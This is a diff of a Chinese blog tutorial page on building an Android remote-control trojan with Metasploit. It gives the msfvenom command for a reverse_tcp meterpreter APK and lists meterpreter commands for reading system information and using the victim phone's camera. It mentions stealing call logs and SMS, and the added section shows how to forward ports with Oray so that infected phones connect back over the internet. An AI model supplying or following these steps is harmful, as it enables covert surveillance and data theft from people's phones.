@@ -14,15 +14,20 @@
 <meta property="og:url" content="http://fjhack.me/2017/04/06/05/index.html">
 <meta property="og:site_name" content="晚睡早起学习好！">
 <meta property="og:description" content="Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/timg.jpg">
 <meta property="og:image" content="http://fjhack.me/img/5.png">
 <meta property="og:image" content="http://fjhack.me/img/6.png">
 <meta property="og:image" content="http://fjhack.me/img/7.png">
 <meta property="og:image" content="http://fjhack.me/img/8.png">
-<meta property="og:updated_time" content="2017-04-06T16:40:25.808Z">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/ZP4L%25PZW%7D@GLD6FTH8A%5D%7DU9.png">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/7T~RA4%29%2894%7D1F$G%7BG23_1U4.png">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/QWTDWS%7D8R8RY6QA0$%7DK%7B_5S.png">
+<meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/14HZQM%259%5BZR3S$L27I%5B3NK7.png">
+<meta property="og:updated_time" content="2017-04-07T16:45:43.476Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用kali和pentestbox下的msf生成安卓木马">
 <meta name="twitter:description" content="Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。">
-<meta name="twitter:image" content="http://fjhack.me/img/5.png">
+<meta name="twitter:image" content="http://oo1re7zx4.bkt.clouddn.com/timg.jpg">
   
     <link rel="alternative" href="/atom.xml" title="晚睡早起学习好！" type="application/atom+xml">
   
@@ -178,7 +183,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。</p>
+        <h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p><img src="http://oo1re7zx4.bkt.clouddn.com/timg.jpg" alt=""><br>“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。</p>
 <a id="more"></a>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">kalilinux :</span></div><div class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="number">10.20</span><span class="number">.72</span><span class="number">.178</span> LPORT=<span class="number">5555</span> R &gt; <span class="regexp">/root/</span><span class="number">1.</span>apk</div></pre></td></tr></table></figure>
 <p><img src="/img/5.png" alt="img"></p>
@@ -196,6 +201,8 @@
 <p>当执行exploit的时候，msf已经处于监听端口的状态，只要你把你刚刚生成的安卓木马安装到对方手机上就会反弹一个msf的shell。</p>
 <p><img src="/img/8.png" alt="img"></p>
 <p>这是本机做测试生成的一个shell，我输入了sysinfo查看了被控端手机的设备信息，执行ifconfig查看了IP，当然，能做的事情不单单只有这么点点，比如还可以下载对方的通话记录，短信记录，开启对方的摄像头，拍照，录音功能，或者如果是root权限的话，直接增删改查任何文件也可是可以的。</p>
+<p>通话记录截图：</p>
+<p><img src="http://oo1re7zx4.bkt.clouddn.com/ZP4L%25PZW%7D@GLD6FTH8A%5D%7DU9.png" alt=""></p>
 <p>命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ifconfig 【查看端口】</div><div class="line">sysinfo   【查看系统信息】</div><div class="line">webcam <span class="type">list</span> 【查看手机存在几个摄像头】</div><div class="line">webcam_snap -i <span class="number">1</span>或<span class="number">2</span>【开启摄像头拍照】</div><div class="line">webcam_stream 【开启摄像头】</div></pre></td></tr></table></figure></p>
 <p>其他命令自己挖掘。可以利用help查看可用的命令。</p>
 <hr>
@@ -204,7 +211,34 @@
 <p>：）</p>
 <p>内网转发的教程明天在写</p>
 <p>pentestbox下载链接：<a href="http://pan.baidu.com/s/1qYU9nsg" target="_blank" rel="external">下载</a></p>
-<p>kalilinux下载链接：<a href="http://pan.baidu.com/s/1bpiW91l" target="_blank" rel="external">下载</a><br><!-- UY BEGIN --></p>
+<p>kalilinux下载链接：<a href="http://pan.baidu.com/s/1bpiW91l" target="_blank" rel="external">下载</a></p>
+<hr>
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><h1 id="pentestbox利用花生壳进行内网转发"><a href="#pentestbox利用花生壳进行内网转发" class="headerlink" title="pentestbox利用花生壳进行内网转发"></a>pentestbox利用花生壳进行内网转发</h1><p>因为IPV4的地址有限，现在已经被分配的差不多了，所以大部分情况下，我们的PC电脑都是在内网当中，内网也就是私有的IP地址，也就是我们常说的局域网，例如：</p>
+<p>192.168.1.0/24</p>
+<p>10.10.20.0/24<br>…<br>上面这几个段都是一个内网C段，我们的PC大部分都是这样的，网吧也是如此。</p>
+<p>私网是不能直接访问互联网的，必须做相关的路由策略或者进行一些配置才能接入到互联网，当然，首先你得有个宽带账号：）</p>
+<p>所以，如果我们想配置安卓木马让外网的用户也能上线的话，我们就需要用到端口转发，也就是说，让别人可以直接访问到我们PC上的某个服务端口，进行建立连接，可以是httpweb网站服务，也可以和一个木马的控制端进行连接，这个其实非常简单！</p>
+<p>这里我们使用到的一个内网端口转发程序是“花生壳”。</p>
+<p>花生壳的原理就是把你想转发的端口，通过服务，映射到某个外网的IP端口，学过网络的人可能知道，这个类似于NAT的多路复用转换原理。确实我感觉也是差不多。</p>
+<p><img src="http://oo1re7zx4.bkt.clouddn.com/7T~RA4%29%2894%7D1F$G%7BG23_1U4.png" alt=""></p>
+<p>首先我们注册一个花生壳的账户，并且在官网下载客户端，这些东西百度就好。</p>
+<p>打开客户端，我们点击内网穿透，进行设置。我们申请一个免费域名，申请免费域名的目的，就是你内网要转发出去的那个服务器地址，这里花生壳利用一个域名当做外部地址。</p>
+<p><img src="http://oo1re7zx4.bkt.clouddn.com/QWTDWS%7D8R8RY6QA0$%7DK%7B_5S.png" alt=""></p>
+<p>这里我已经申请了两个免费域名，并且配置好了。</p>
+<p>如果我们要添加一个内网穿透的地址，那么我们只要点击添加映射就行，如图：</p>
+<p><img src="http://oo1re7zx4.bkt.clouddn.com/14HZQM%259%5BZR3S$L27I%5B3NK7.png" alt=""></p>
+<p>上面的内容首先你添加一个名称，随便填即可。</p>
+<p>然后填写你自己当前内网主机的IP地址，通过cmd下的ipconfig可以查看到</p>
+<p>注：动态IP会每次重启后自动从dhcp服务器获取一个地址，所以不是固定的内网地址。</p>
+<p>然后添加一个你要转发的端口号，因为当我们设置木马的时候，可以自己设置监听端口，所以，这里只要和木马的监听端口保持一致就好。</p>
+<p>当我们设置好之后，我们就可以配置我们的木马了。</p>
+<p>木马的配置上面讲的很明白，需要改动的地方，只要把反弹的地址IP换成你的域名地址，和你刚刚设置的端口号即可。</p>
+<p>但是当我们msf设置本地监听的时候，我们需要设置监听的地址为我们本地的主机IP和端口，这些其实很简单。</p>
+<p>以上做完以后，基本一个安卓木马的内外网上线已经很清楚了，如果不懂得话自己多琢磨就可以弄得很明白，或者在下面留言就好。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然这个实验目的技术要求不高，但是确实学到了很多东西，比如，内网转发，msf的基础使用，还有一些最基础的网络知识，当然，这些知识基础而已，更高级的的木马配置涉及到免杀绕过主动防御，自动上线反弹，等等，需要很底层的知识，遗憾的是我对这方面也不是很懂，需要自己不断地探索。</p>
+<p>：）</p>
+<!-- UY BEGIN -->
 <p><div id="uyan_frame"></div></p>
 <p><script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2129863"></script><br><!-- UY END --></p>
 
